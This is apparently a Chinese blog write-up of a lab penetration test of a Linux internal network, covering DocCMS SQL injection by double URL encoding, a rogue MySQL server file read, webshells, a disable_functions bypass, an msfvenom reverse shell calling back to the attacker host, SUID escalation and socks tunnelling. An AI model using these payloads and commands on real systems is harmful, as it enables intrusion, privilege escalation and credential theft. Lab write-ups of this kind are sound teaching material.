---
title: web漏洞@记一次Linux内网渗透测试
date: 2021-10-03 20:10:03
cover: https://gitee.com/tutucoo/images/raw/master/uPic/cute_cottage_on_a_cliff_in_the_woods_and_th____by_raphaelle_deslandes_demul7k-fullview.jpg
---

## 概况

### 攻击主机

192.168.0.128

### 内网1号机

内网1号机:192.168.0.122/10.10.10.145  密码：yanisy123

内网1号设置静态ip

点击编辑连接 

![Untitled](https://i.loli.net/2021/10/03/A5IwYGpQl34768U.png)

设置静态ip

![Untitled](https://i.loli.net/2021/10/03/cSA17vs5Fb3IiWx.png)

两张网卡都设置好以后断开重连

![Untitled](https://i.loli.net/2021/10/03/OJ4cWzASqEt8NUj.png)

内网1号机根目录下有bt.txt，里面有一个宝塔的后台网址以及用户名密码

![Untitled](https://i.loli.net/2021/10/03/UgutS9EcbJ5NAMn.png)

直接访问8888端口会跳转到login

![Untitled](https://i.loli.net/2021/10/03/akprXlV2zcPLD9x.png)

80端口直接访问会提示错误，需要在hosts文件中绑定到www.ddd4.com，这好像是宝塔的设定，宝塔后台建立了一个网站www.ddd4.com，无法通过ip直接访问，需要访问域名

![Untitled](https://i.loli.net/2021/10/03/caoP9yBvWI3e8xA.png)

### 内网2号机

内网2号机:10.10.10.144

## 扫描内网主机

nmap发现内网主机，一共两台，分别是192.168.0.122和192.168.0.109，109是攻击机，122是内网1号机

![Untitled](https://i.loli.net/2021/10/03/w2vZpGCAzDLfsR3.png)

## 端口探测

探1号机端口

```python
nmap -sV -v 192.168.0.122
```

![Untitled](https://i.loli.net/2021/10/03/JDqYguBx1RSmbNQ.png)

## 扫目录

```python
gobuster dir -u http://www.ddd4.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html' -o dir.log --wildcard
```

用上面的指令进行扫描时会有很多响应是200，但是长度是一样的，这都是错误页，要将它们过滤掉

![Untitled](https://i.loli.net/2021/10/03/KNvcbo9AS18IWJs.png)

过滤语句

```python
gobuster dir -u http://www.ddd4.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 'php,html' -o dir.log --wildcard | grep -v "Size: 11807"|grep -v "Size:49"
```

## 查看网站信息

用whatweb查看网站信息 ，不同的域名返回的信息不一样

![Untitled](https://i.loli.net/2021/10/03/wly4JUdzAWB1ksD.png)

## 网站搭建

把ddd4.com的源码下载下来并创建网站进行测试

![Untitled](https://i.loli.net/2021/10/03/yLBu5qpzl3xmtGf.png)

需要手动在hosts文件中绑定www.duo1.com或者用同步hosts

然后访问www.duo1.com进行安装，之后就可以访问了

## 代码审计-二次编码

目标是DocCMS，代码审计要多关注过滤规则，看有没有绕过的方法

看到很多urldecode函数，这里可能存在二次编码注入

![Untitled](https://i.loli.net/2021/10/03/YZKvMArpwtRWV4h.png)

原文是11111'，对其进行两次url编码，执行后仍然会被解析成11111'

![Untitled](https://i.loli.net/2021/10/03/YKQzbNkvaE12CTP.png)

有的时候一次编码会被过滤掉，但是二次编码就可以绕过防护

调用一些过滤函数，看过滤效果

![Untitled](https://i.loli.net/2021/10/03/d9jMaPfk4uGl1g3.png)

可以看到对单引号进行了过滤

![Untitled](https://i.loli.net/2021/10/03/UMXdqhkjzANH5I9.png)

如果对payload进行二次编码则可以绕过

![Untitled](https://i.loli.net/2021/10/03/O4brdawqne9op6I.png)

找到一处地址存在sql注入，这里checkSqlStr可以用二次url编码绕过

![Untitled](https://i.loli.net/2021/10/03/EGYBcfI54L1hQ2v.png)

这个函数位于content/search/index.php，所以构造如下，确实存在注入

![Untitled](https://i.loli.net/2021/10/03/X4Hq3uwUYzBDVfS.png)

sqlmap跑一遍，成功跑出数据  

```python
python3 sqlmap.py -u http://www.ddd4.com/search?keyword=11 --dbms mysql -v 1 --tamper chardoubleencode.py
```

## 代码审计-mysql任意文件读取漏洞

setup/checkdb.php里面有一段代码，这段代码会导致mysql远程连接任意文件读取漏洞

```php
<?php
$dbhost = $_REQUEST['dbhost'];
$uname  = $_REQUEST['uname'];
$pwd	= $_REQUEST['pwd'];
$dbname	= $_REQUEST['dbname'];
if($_GET['action']=="chkdb"){
	$con = @mysql_connect($dbhost,$uname,$pwd);
	if (!$con){
		die('-1');
	}
	$rs = mysql_query('show databases;');
	while($row = mysql_fetch_assoc($rs)){
		$data[] = $row['Database'];
	}
	unset($rs, $row);
	mysql_close();
	if (in_array(strtolower($dbname), $data)){
		echo '1';
	}else{
	   echo '0';
	}
}elseif($_GET['action']=="creatdb"){
	if(!$dbname){
		die('0');
	}
	$con = @mysql_connect($dbhost,$uname,$pwd);
	if (!$con){
		die('-1');
	}
	if (mysql_query("CREATE DATABASE {$dbname} DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci",$con)){
	  echo "1";
	}else{
	  echo mysql_error();
	}
	mysql_close($con);
}
exit;
?>
```

通过rogue-mysql-server读取/etc/passwd

![Untitled](https://i.loli.net/2021/10/03/1tDJyipG5gIlzKd.png)

使用python2.x运行Rogue-MySql-Server服务，运行伪造mysql服务器，等待连接

![Untitled](https://i.loli.net/2021/10/03/wlCr81MJxY4RZta.png)

访问url触发漏洞,192.168.0.128是攻击机，这里ip进行了更改，为了统一，之后三台主机会分别统称攻击机、内网1号机（1号机）、内网2号机（2号机）

```python
http://www.ddd4.com/setup/checkdb.php?dbname=mysql&uname=root&pwd=123456&dbhost=192.168.0.128&action=chkdb
```

访问url触发，漏洞触发还导致暴露了根目录

![Untitled](https://i.loli.net/2021/10/03/VsPIgKqbNeXmGZL.png)

再看mysql.log文件，etc/passwd文件内容已经读取到了

![Untitled](https://i.loli.net/2021/10/03/GgQjRSUpc64TZre.png)

再根据暴露出来的根目录修改脚本，读取doc-config-cn.php文件内容

![Untitled](https://i.loli.net/2021/10/03/sDlRuv6N859MYqx.png)

可以看到DB_DBNAME、DB_USER、DB_PASSWORD几个字段，有了这些字段就可以连接到目标数据库了

![Untitled](https://i.loli.net/2021/10/03/4XRGzOEd89KcBNm.png)

连接目标数据库

```python
mysql -h192.168.0.122 -uwww_ddd4_com -px4ix6ZrM7b8nFYHn
```

![Untitled](https://i.loli.net/2021/10/03/ed45rguZpG2SxDs.png)

## 代码审计-破解算法登陆后台

这里是后台地址

![Untitled](https://i.loli.net/2021/10/03/LRsYXUEdKgWr82N.png)

找到源码加密算法

![Untitled](https://i.loli.net/2021/10/03/qpP34yDzgXLcu79.png)

这里可以在根目录创建一个test.php，然后调用这个算法

![Untitled](https://i.loli.net/2021/10/03/ncdLmiJRDAjEGaF.png)

admin加密后是33e2...

![Untitled](https://i.loli.net/2021/10/03/BjkXYWa9uclb2PG.png)

前面已经拿到数据库权限，因此可以修改admin用户名的密码为33e2....，然后就可以通过admin/admin登陆后台了

![Untitled](https://i.loli.net/2021/10/03/27R3NqxLhugoGIO.png)

## 代码审计-后台任意文件上传漏洞

admini\controllers\system\bakup.php

![Untitled](https://i.loli.net/2021/10/03/fwS2Kti7UgOmpEB.png)

这里过滤了后缀名，不过即使后缀名检测不通过，没有退出机制，文件依然会被上传 

随便找个上传点测一下参数m表示控制器名称，参数s表示文件名，参数a表示方法名

![Untitled](https://i.loli.net/2021/10/03/gxub7UceLFZCGMv.png)

把路径修改为uploadsql的路径进行上传，虽然返回错误提示不过在后台可以看到文件已经上传了

![Untitled](https://i.loli.net/2021/10/03/S8tEyX69GDdlF45.png)

![Untitled](https://i.loli.net/2021/10/03/9h4d2YVrQnZDuKl.png)

不过.htaccess文件禁止了temp目录的访问，因此无法getshell

![Untitled](https://i.loli.net/2021/10/03/oHQjl7rBXNqdnbt.png)

## 后台模板编辑getshell

在后台模板中编辑，插入一句话，重新应用一下模板

![Untitled](https://i.loli.net/2021/10/03/qwykj7QGzSAVmDN.png)

一句话是插入到首页上面的，所以菜刀连接首页

![Untitled](https://i.loli.net/2021/10/03/XvtEsCB3FMeAg5m.png)

直接getshell 

![Untitled](https://i.loli.net/2021/10/03/fs3hLtg2bjRkFE4.png)

## 宝塔命令执行提权

上面通过模板编辑拿到的shell不能执行命令

![Untitled](https://i.loli.net/2021/10/03/WZo93aLSxbQNzdl.png)

上传bypass_disablefunc.php、bypass_disablefunc_x64.so、bypass_disablefunc_x86.so到根目录，然后通过下面的payload执行ifconfig命令，这样可以绕过宝塔对命令执行的限制 

```python
www.ddd4.com/bypass_disablefunc.php?cmd=ifconfig&outpath=/tmp/xx&sopath=/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so
```

![Untitled](https://i.loli.net/2021/10/03/EcpxSRqBidZJ6te.png)

## msf可交互shell

既然已经getshell也可以执行命令了，就可以尝试上传个反向shell，创建一个可交互式的shell

首先生成反向shell程序

```python
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.128 LPORT=13777 -f elf > ddd4
```

![Untitled](https://i.loli.net/2021/10/03/O3KofIvtJ74h6DS.png)

先通过菜刀把反向shell程序上传到根目录，然后对反向shell程序进行提权，默认没有执行权限，这里提权就用上了刚才用的宝塔命令执行绕过脚本

```python
http://www.ddd4.com/bypass_disablefunc.php?cmd=chmod%20777%20ddd4&outpath=/tmp/xx&sopath=/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so
```

现在有了执行权限

![Untitled](https://i.loli.net/2021/10/03/azTAhC4MFrd6Z7c.png)

msf进行监听

![Untitled](https://i.loli.net/2021/10/03/3tY2mhHoJCjafPW.png)

执行ddd4

```python
http://www.ddd4.com/bypass_disablefunc.php?cmd=./ddd4&outpath=/tmp/xx&sopath=/www/wwwroot/www.ddd4.com/bypass_disablefunc_x64.so
```

msf反弹shell成功 

![Untitled](https://i.loli.net/2021/10/03/XCRA3N7ajg4ukmr.png)

为了更方便的操作，在msf里面可以切换shell

```python
python -c 'import pty;pty.spawn("/bin/bash")'
```

![Untitled](https://i.loli.net/2021/10/03/DWrCstMVaZ2fwH6.png)

## 通过宝塔计划任务反弹shell

桌面存在文件bt.txt，里面有宝塔后台的ip和用户名密码

ip：[http://192.168.0.122:8888/944906b5/](http://192.168.0.122:8888/944906b5/)

用户名：gpeqnjf4

密码：d12924fa

![Untitled](https://i.loli.net/2021/10/03/cBwQEVvfTtk6iXF.png)

找到创建计划任务的地方创建一个计划任务

![Untitled](https://i.loli.net/2021/10/03/xPenoishYSwfT8A.png)

本机监听，准备反弹shell

```python
nc -lvnp 9001
```

手动执行任务，反弹shell成功

![Untitled](https://i.loli.net/2021/10/03/cAM7jDVfHdv1bEo.png)

权限是root

![Untitled](https://i.loli.net/2021/10/03/te9VSM1lchWYwXr.png)

上一个部分，我们上传了一个反向shell程序ddd4到内网1号机，但是它的权限不够，可以利用这里的root权限对刚才的反向shell程序进行提权

这里getshell连接上之后进入根目录

```python
cd /
```

然后再cd到www\wwwroot\www.ddd4.com目录，执行ddd4执行，此时ddd4是root权限

本地msf开启监听，反弹shell之后权限是root

![Untitled](https://i.loli.net/2021/10/03/ltNcA3B45QLyqHf.png)

## suid提权

执行下面命令搜索到有guid权限的程序  

```python
find / -type f -perm -u=s 2>/dev/null
```

利用find程序进行提权

## sudo提权

sudo提权需要知道密码，可以通过一些linux信息收集工具收集到历史记录文件等，也许可以找到密码

## Linux内网权限扫描脚本

### LinEnum使用

github下载后，直接运行LinEnum.sh程序就可以了，如果要在远程主机上使用可以先在本机创建一个http服务器

```python
python3 -m http.server 80
```

http服务器是在哪个目录开启的，哪里就是根目录

在目标机中进行下载

```python
wget 192.168.0.128/LinEnum.sh
```

在目标机上执行发现权限不足，可以利用suid提权

```python
mkdir testfind test -exec chmod 777 ./LinEnum.sh \;
```

扫描结果 

![Untitled](https://i.loli.net/2021/10/03/nYLZjkC3h2J1y9m.png)

### linux-exploit-suggester的使用

这个用来检测是否存在提权 cve 漏洞

![Untitled](https://i.loli.net/2021/10/03/3c2O1WhyP6lwx74.png)

### linuxprivchecker

检测权限以及提权漏洞检测等

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2052.png)

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2053.png)

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2054.png)

## Linux socks5内网穿透

1、下载ssocks0.0.1并编译

```python
./configure && make
```

2、进入ssocks\src目录，攻击机执行rcsocks

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2055.png)

3、进入内网1号机，执行rssocks程序

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2056.png)

4、攻击机设置proxychains代理

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2057.png)

使用proxychains代理扫描内网2号机开放的端口，此时应正常扫描，说明内网穿透成功

```python
proxychains3 nmap -sT -Pn 10.10.10.128
```

在浏览器里直接设置socks代理就可以直接访问web网页

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2058.png)

ddd5.com是内网2号机上部署的网站，ip为10.10.10.128，攻击机可以直接访问，也可以说明内网穿越成功

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2059.png)

## 模板上传getshell

查看内网1号机的hosts文件，绑定www.ddd5.com，进入发现是一个博客，采用emlog搭建

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2060.png)

admin\123456进入后台可以直接上传模板，可以照着emlog模板复制一份，另外加上大马和一句话木马，压缩成zip后上传

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2061.png)

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2062.png)

访问大马

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2063.png)

一句话木马执行命令

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2064.png)

## 蚁剑穿透内网

创建一个虚拟机windows7，确保可以跟内网1号机通信，因为1号机之前已经设置了代理，可以直接穿透内网

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2065.png)

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2066.png)

下面设置代理，不过不设置也可以连通 

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2067.png)

进入命令行，查看可以登陆的用户信息 

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2068.png)

## wdcp系统提权

访问内网2号机发现是wdlinux

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2069.png)

进入8080端口访问wdcp登陆面板

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2070.png)

登陆面板进不去，不过有个phpmyadmin面板可以进去，用root\wdlinux.cn登陆进去了 

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2071.png)

找到登陆面板的用户名和密码，admin\moonsec123

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2072.png)

进来了 

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2073.png)

有一个命令运行器，可以看到是root权限  

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2074.png)

尝试反弹shell，提示危险命令

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2075.png)

ssh管理，这里可以下载密钥，在下载之前需要先点击生成密钥

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2076.png)

通过内网穿透代理直接ssh登陆

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2077.png)

可以看到是root权限 

![Untitled](https://gitee.com/tutucoo/images/raw/master/uPic/Untitled%2078.png)

先玩到这里~谢谢观看

